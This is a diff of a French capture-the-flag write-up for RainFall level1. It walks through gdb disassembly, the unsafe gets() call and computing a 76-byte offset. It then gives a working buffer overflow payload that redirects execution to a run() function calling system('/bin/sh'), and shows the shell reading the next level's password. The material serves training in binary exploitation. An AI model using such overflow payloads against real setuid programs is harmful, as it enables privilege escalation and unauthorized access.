@@ -5,32 +5,53 @@
 /_/\___/|___/\___/_//_/   
                            
 
-Nous avons un executable ./level1 avec les setuid/setgid.
 
-   0x08048486 <+6>:	sub    $0x50,%esp
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+>$ level1@RainFall:~$ ./level1 
+   AAAA
 
-Avec gdb on voit 80 octets alloue puis plus loin un appel a gets.
-La fonction gets contient une faille comme indiquee dans le man que nous allons
-exploitee via un buffer overflow.
+>$ level1@RainFall:~$ ./level1
+   AAAAA BBBB
+   
+L'éxecutable nous onvre un prompt, nous entrons des chaines de caractères et le programme semble pousuivre son cours
+mais rien ne se passe.
 
-Nous allons calculer la size de notre buffer en soustrayant l'adresse de retour
-(break avant le leave) EIP avec l'adresse du debut de notre buffer.
+>$ objdump -d level1
 
-(gdb) info frame
-Stack level 0, frame at 0xbffff700:
- eip = 0x8048495 in main; saved eip 0xb7e454d3
- Arglist at 0xbffff6f8, args:
- Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
- Saved registers:
-  ebp at 0xbffff6f8, eip at 0xbffff6fc
+On consatte la présence d'un <main> et celle d'une fonction <run> qui contient notamment un appel à system(). Cependant <run> n'est pas présente dans le <main>. 
+
+Nous allons étudier le <main> dans un premier temps, puis <run> :
+
+____________________________________________________________________________________________________________________________________________________________________
+
+(gdb) disas main
+Dump of assembler code for function main:	        On constate un appel à la fonction fgets(). Or, on peut lire dans man :
+   0x08048480 <+0>:	push   %ebp			
+   0x08048481 <+1>:	mov    %esp,%ebp		"N'utilisez jamais gets(). Comme il est impossible de savoir à l'avance combien de caractères seront lus 
+   0x08048483 <+3>:	and    $0xfffffff0,%esp		par gets(), et comme celui-ci écrira tous les caractères lus, même s'ils débordent du tampon, cette  
+   0x08048486 <+6>:	sub    $0x50,%esp	        fonction est extrèmement dangereuse à utiliser. On a déjà utilisé ce dysfonctionnement pour créer des
+   0x08048489 <+9>:	lea    0x10(%esp),%eax		trous de sécurité. Utilisez fgets() à la place."
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>	gets() est dnotamment vulnérable aux bufferoverflow
+   0x08048495 <+21>:	leave
+   0x08048496 <+22>:	ret
+End of assembler dump.
+____________________________________________________________________________________________________________________________________________________________________
+
+Comment fonctionne un bufferoverflow ?
+
+Le fonctionnement général d'un buffer overflow est de faire crasher un programme en écrivant dans un buffer plus de données qu'il ne peut en contenir 
+dans le but d'écraser des parties du code de l'application et d'injecter des données utiles pour exploiter l'application.
+
+Calculons donc la taille de notre buffer en soustrayant l'adresse de debut de notre buffer à celle de la fin de notre buffer.
+
+On affiche notre le haut de notre stack et on identifie notre input de "A" :
 
 (gdb) x /30xw $esp
 0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4
-0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141	------------> Fin à 0xbffff6b0
 0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff6e0:	0x41414141	0x41414141	0x08040041	0xb7fd0ff4
+0xbffff6e0:	0x41414141	0x41414141	0x08040041	0xb7fd0ff4	------------> Début à 0xbffff6fc suivis de notre EIP sauvegardé
 0xbffff6f0:	0x080484a0	0x00000000	0x00000000	0xb7e454d3
 0xbffff700:	0x00000001	0xbffff794	0xbffff79c	0xb7fdc858
 0xbffff710:	0x00000000	0xbffff71c
@@ -38,72 +59,24 @@ Stack level 0, frame at 0xbffff700:
 (gdb) p /d 0xbffff6fc - 0xbffff6b0
 $1 = 76
 
-Notre buffer est donc de 76 octets.
+Notre buffer est donc de taille 76. L'EIP sauvegardé correspond à l'adresse à laquelle le programme retournera une le <main> éxecuté.
 
-Nous jetons un coup d'oeils au fonctions definies dans notre programme:
-
-(gdb) info functions
-All defined functions:
-
-Non-debugging symbols:
-0x080482f8  _init
-0x08048340  gets
-0x08048340  gets@plt
-0x08048350  fwrite
-0x08048350  fwrite@plt
-0x08048360  system									<-----------
-0x08048360  system@plt
-0x08048370  __gmon_start__
-0x08048370  __gmon_start__@plt
-0x08048380  __libc_start_main
-0x08048380  __libc_start_main@plt
-0x08048390  _start
-0x080483c0  __do_global_dtors_aux
-0x08048420  frame_dummy
-0x08048444  run										<------------
-0x08048480  main
-0x080484a0  __libc_csu_init
-0x08048510  __libc_csu_fini
-0x08048512  __i686.get_pc_thunk.bx
-0x08048520  __do_global_ctors_aux
-0x0804854c  _fini
-
-Nous voyons ici la fonction system qui n'est pas appele dans le main et il en
-est de meme pour la fonction run.
-Regardons de plus pres cette fonction run:
+La fonction <run> contenant un appel à system() semble être un bon point de chute si nous parvenons à réécrire l'EIP en entrant plus de 76 octets. 
 
    0x08048472 <+46>:	movl   $0x8048584,(%esp)
    0x08048479 <+53>:	call   0x8048360 <system@plt>
 
-	(gdb) x/s 0x8048584
-	0x8048584:	 "/bin/sh"
+Cette fonction nous permet de lancer un shell, car ici la fonction system() prend en paramètre $0x8048584 qui correspond à "\bin\sh".
 
-Ces deux lignes nous interessent, on y trouve la chaine "/bin/sh" qui est moove
-sur le haut de la pile avant le call a system.
-Cette fonction nous permet donc de lancer un shell..
+Montons notre exploit :
 
-Le bufferoverflow exploitable de gets et cette fonction run sont les outils
-qui vont nous permettre de passe le niveau suivant.
+Le "cat" nous permet de maintenir le shell ouvert. En effet, une fois executer via <run>, le shell attendra un input.
 
-Nous preparons notre script de 76 chars suivi de l'adresse de run:
-
-level1@RainFall:~$ python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/buffa
-
-Nous n'avons plus qu'a lance le tout:
-Nous envoyer les deux outputs de cat un sur le fichier l'autre sur stdin qui
-serviront d'input pour le binaire.
-Le premier cat, celui de notre exploit servira a injecter notre code via
-le gets, le deuxieme nous permet de maintenir le shell ouvert.
-En effet, une fois executer via run, le shell attendra un input pour pouvoir
-fonctionner, cependant le gets a recuperer l'input il n'y aurait donc plus rien
-a utiliser pour le shell et il aurait donc exit, nous lui envoi donc un input
-sur stdin pour qu'il puisse rester exploitable.
-
-level1@RainFall:~$ (cat /tmp/buffa; cat ) | ./level1
-Good... Wait what?
-whoami
-level2
-cat /home/user/level2/.pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+>$ level1@RainFall:~$ (python -c 'print ("A" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
+   Good... Wait what?
+   whoami
+   level2
+   cat /home/user/level2/.pass
+   53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
 Next level..
